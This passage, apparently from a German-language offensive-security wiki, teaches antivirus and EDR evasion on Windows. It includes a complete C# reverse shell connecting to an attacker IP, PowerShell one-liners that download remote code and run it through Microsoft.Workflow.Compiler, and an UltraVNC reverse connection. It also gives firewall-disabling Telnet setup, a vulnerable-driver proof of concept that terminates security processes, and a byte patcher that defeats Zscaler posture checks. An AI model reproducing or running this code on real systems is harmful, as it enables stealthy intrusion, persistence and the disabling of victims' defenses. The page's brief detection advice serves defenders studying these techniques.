1.  Entfernung des Anti-Tampering-Schutzes – ConfuserEx verschlüsselt jeden *Methodenkörper* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme verändert, sodass jede Änderung zum Absturz der Binärdatei führt. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu lokalisieren, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tampering-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Wiederherstellung von Symbolen und Kontrollfluss – übergeben Sie die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-kompatiblen Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx-2-Profil aus
• de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Entfernen von Proxy-Aufrufen – ConfuserEx ersetzt direkte Methodenaufrufe durch leichtgewichtige Wrapper (auch *Proxy-Aufrufe* genannt), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` anstelle von undurchsichtigen Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führen Sie die resultierende Binärdatei unter dnSpy aus und suchen Sie nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *eigentliche* Payload zu lokalisieren. Häufig speichert die Malware sie als ein TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss wieder her, **ohne das bösartige Sample ausführen zu müssen** – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Kompilierungssuite bereitzustellen, der durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Tamper-Proofing eine erhöhte Softwaresicherheit ermöglicht.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie die Sprache `C++11/14` verwendet werden kann, um zur Compile-Zeit obfuskierten Code zu generieren, ohne externe Tools zu verwenden oder den Compiler zu modifizieren.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuskierter Operationen hinzu, die vom C++-Template-Metaprogramming-Framework generiert werden und der Person, die die Anwendung cracken möchte, das Leben etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphic code für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein abgestuftes Code-Obfuscation-Framework für LLVM-unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Code-Ebene, indem reguläre Instructions in ROP-Chains umgewandelt werden und dadurch unser natürliches Verständnis eines normalen Control-Flows vereitelt wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann bestehende EXE/DLL-Dateien in Shellcode umwandeln und anschließend laden.

## SmartScreen & MoTW

Möglicherweise ist dieser Bildschirm beim Herunterladen und Ausführen bestimmter Executables aus dem Internet bereits aufgefallen.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz. Das bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und dadurch den Endbenutzer warnen und daran hindern, die Datei auszuführen (die Datei kann jedoch weiterhin ausgeführt werden, indem man auf More Info -> Run anyway klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird, zusammen mit der URL, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass Executables, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert wurden, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, zu verhindern, dass deine Payloads mit dem Mark of The Web versehen werden, besteht darin, sie in eine Art Container wie eine ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabecontainer verpackt, um Mark-of-the-Web zu umgehen.

Beispielhafte Verwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mithilfe von [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten verwendet werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die **`EtwEventWrite`**-Funktion des User-Space-Prozesses sofort zurückkehren zu lassen, ohne Ereignisse zu protokollieren. Dies geschieht, indem die Funktion im Speicher so gepatcht wird, dass sie sofort zurückkehrt, wodurch das ETW-Logging für diesen Prozess effektiv deaktiviert wird.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist bereits seit längerer Zeit bekannt und weiterhin eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da der Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns lediglich um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Dafür gibt es jedoch verschiedene Vorgehensweisen:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, der schädliche Post-Exploitation-Codes injiziert bekommt. Anschließend wird der schädliche Code ausgeführt und der neue Prozess nach Abschluss beendet. Dies hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode besteht darin, dass die Ausführung **außerhalb unseres Beacon-Implant-Prozesses** stattfindet. Wenn also bei unserer Post-Exploitation-Aktion etwas schiefgeht oder erkannt wird, besteht eine **deutlich höhere Wahrscheinlichkeit**, dass unser **Implant überlebt**. Der Nachteil besteht darin, dass eine **höhere Wahrscheinlichkeit** besteht, von **Behavioural Detections** erkannt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hierbei wird der schädliche Post-Exploitation-Code **in den eigenen Prozess** injiziert. Dadurch muss kein neuer Prozess erstellt und von AV gescannt werden. Der Nachteil besteht jedoch darin, dass bei einem Fehler während der Ausführung deines Payloads eine **deutlich höhere Wahrscheinlichkeit** besteht, den **Beacon zu verlieren**, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) sowie deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)).

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir dazu [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, schädlichen Code in anderen Sprachen auszuführen, indem der kompromittierte Rechner Zugriff **auf die Interpreter-Umgebung erhält, die auf dem Attacker Controlled SMB share installiert ist**.

Indem Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB share gewährt wird, kann **beliebiger Code in diesen Sprachen innerhalb des Speichers** des kompromittierten Rechners ausgeführt werden.

Das Repository weist darauf hin: Defender scannt die Skripte weiterhin, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität beim Umgehen statischer Signaturen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die es einem Angreifer ermöglicht, **das Access Token oder ein Sicherheitsprodukt wie einen EDR oder AV zu manipulieren**, sodass dessen Berechtigungen reduziert werden. Dadurch beendet sich der Prozess nicht, verfügt jedoch nicht mehr über die erforderlichen Berechtigungen, um nach schädlichen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **externen Prozessen den Zugriff auf die Handles** der Tokens von Sicherheitsprozessen verweigern.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem Rechner eines Opfers zu installieren, anschließend die Kontrolle darüber zu übernehmen und Persistence aufrechtzuerhalten:
1. Lade die Software von https://remotedesktop.google.com/ herunter, klicke auf "Set up via SSH" und anschließend auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer auf dem Rechner des Opfers im Hintergrund aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf "Next". Der Assistent fordert dich anschließend zur Autorisierung auf. Klicke auf die Schaltfläche "Authorize", um fortzufahren.
4. Führe den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachte den Pin-Parameter, mit dem sich die PIN festlegen lässt, **ohne die GUI zu verwenden**.)

## Advanced Evasion

Evasion ist ein sehr komplexes Thema. Manchmal müssen viele verschiedene Telemetriequellen in nur einem System berücksichtigt werden, weshalb es in ausgereiften Umgebungen praktisch unmöglich ist, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittenere Evasion-Techniken zu erhalten.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist außerdem ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Prüfen, welche Teile Defender als schädlich erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile des Binaries**, bis es **feststellt, welcher Teil von Defender** als schädlich erkannt wird, und gibt diesen Teil aus.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred). Der Dienst ist offen im Web unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) verfügbar.

### **Telnet Server**

Bis Windows 10 verfügte jede Windows-Version über einen **Telnet-Server**, den du (als Administrator) wie folgt installieren konntest:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Beim Systemstart **starten** und jetzt ausführen:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (Stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Lade es herunter von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die Binärdateien, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe anschließend die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Opfer**

#### **Reverse connection**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` **ausführen**, damit er darauf **vorbereitet** ist, eine Reverse-**VNC-Verbindung** abzufangen. Führe anschließend auf dem **Opfer** den winvnc-Daemon mit `winvnc.exe -run` aus und starte `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNUNG:** Um die Tarnung aufrechtzuerhalten, darfst du einige Dinge nicht tun:

- Starte `winvnc` nicht, wenn es bereits ausgeführt wird, da dadurch ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst wird. Prüfe mit `tasklist | findstr winvnc`, ob es ausgeführt wird.
- Starte `winvnc` nicht ohne _**UltraVNC.ini**_ im selben Verzeichnis, da dadurch [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet wird.
- Führe `winvnc -h` nicht für die Hilfe aus, da dadurch ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird.

### GreatSCT

Lade es herunter von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
In GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte nun den **lister** mit `msfconsole -r file.rc` und **führe** den **xml payload** mit folgendem Befehl aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unsere eigene Reverse Shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere sie mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwende es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit Compiler verwenden
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und automatische Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python zur Erstellung von Injectors verwenden – Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel Space ausschalten

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmechanismen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light-(PPL)-AV-Dienste nicht blockieren können.

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf dem Datenträger abgelegte Datei heißt `ServiceMouse.sys`, aber das Binary ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch geladen, wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland erreichbar wird.
3. **Vom Treiber bereitgestellte IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beendet einen beliebigen Prozess anhand seiner PID (zum Beenden von Defender/EDR-Diensten verwendet) |
| `0x990000D0` | Löscht eine beliebige Datei auf dem Datenträger |
| `0x990001D0` | Entlädt den Treiber und entfernt den Service |

Minimales C Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht den User-Mode-Schutz vollständig. Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Hardening-Features.

Erkennung / Mitigation
•  Microsofts vulnerable-driver block list (`HVCI`, `Smart App Control`) aktivieren, damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Das Erstellen neuer *Kernel*-Services überwachen und einen Alert auslösen, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List vorhanden ist.
•  Auf User-Mode-Handles zu benutzerdefinierten Device-Objekten achten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Umgehen der Zscaler Client Connector Posture Checks durch Binary-Patching auf dem Datenträger

Zscalers **Client Connector** wendet Device-Posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Auswertung erfolgt **vollständig clientseitig** (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob das verbindende Executable **von Zscaler signiert** ist (über `WinVerifyTrust`).

Durch das **Patching von vier signierten Binaries auf dem Datenträger** können beide Mechanismen neutralisiert werden:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess, auch ein unsignierter, kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Durch `mov eax,1 ; ret` ersetzt |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kurzgeschlossen |

Minimaler Patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nach dem Ersetzen der ursprünglichen Dateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Nicht signierte oder veränderte Binaries können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit einigen wenigen Byte-Patches umgehen lassen.

## Protected Process Light (PPL) zum Manipulieren von AV/EDR mit LOLBINs missbrauchen

Protected Process Light (PPL) erzwingt eine Hierarchie aus Signer und Level, sodass nur gleich oder höher geschützte Prozesse sich gegenseitig manipulieren können. Aus offensiver Sicht kann man, wenn sich eine PPL-fähige Binary legitim starten lässt und ihre Argumente kontrolliert werden können, eine harmlose Funktionalität (z. B. Logging) in eine eingeschränkte, PPL-gestützte Schreibprimitive gegen geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.

Was dazu führt, dass ein Prozess als PPL ausgeführt wird
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einer PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess unter Verwendung der Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss ein kompatibles Protection Level angefordert werden, das zum Signer der Binary passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer und `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen dazu, dass die Erstellung fehlschlägt.

Siehe auch eine ausführlichere Einführung in PP/PPL und den LSASS-Schutz:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt das Protection Level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Verwendungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
